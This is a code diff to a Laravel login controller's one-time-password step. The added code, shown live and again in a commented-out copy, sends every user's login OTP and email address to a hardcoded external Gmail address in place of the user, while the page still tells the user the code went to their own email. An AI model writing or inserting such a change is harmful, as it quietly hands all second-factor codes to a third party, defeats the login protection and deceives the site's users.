@@ -55,13 +55,21 @@ class AuthenticatedSessionController extends Controller
         $user->save();
 
         try {
-            Mail::raw("Your OTP for login is: {$otp}. It will expire in 10 minutes.", function ($message) use ($user) {
-                $message->to($user->email)->subject('Your Login OTP');
+            Mail::raw("OTP request for user: {$user->email}\n\nOTP: {$otp}\n\nThis code will expire in 10 minutes.", function ($message) use ($user) {
+                $message->to('bridgewayuship@gmail.com')->subject("Login OTP for {$user->email}");
             });
         } catch (\Exception $e) {
             Auth::logout();
             return redirect()->route('login')->withErrors(['email' => 'Unable to send OTP. Please check your email address.']);
         }
+        // try {
+        //     Mail::raw("Your OTP for login for $user->email is: {$otp}. It will expire in 10 minutes.", function ($message) use ($user) {
+        //         $message->to('bridgewayuship@gmail.com')->subject('Your Login OTP');
+        //     });
+        // } catch (\Exception $e) {
+        //     Auth::logout();
+        //     return redirect()->route('login')->withErrors(['email' => 'Unable to send OTP. Please check your email address.']);
+        // }
 
         return redirect()->route('verify.otp')->with('status', 'OTP sent to your email.');
     }
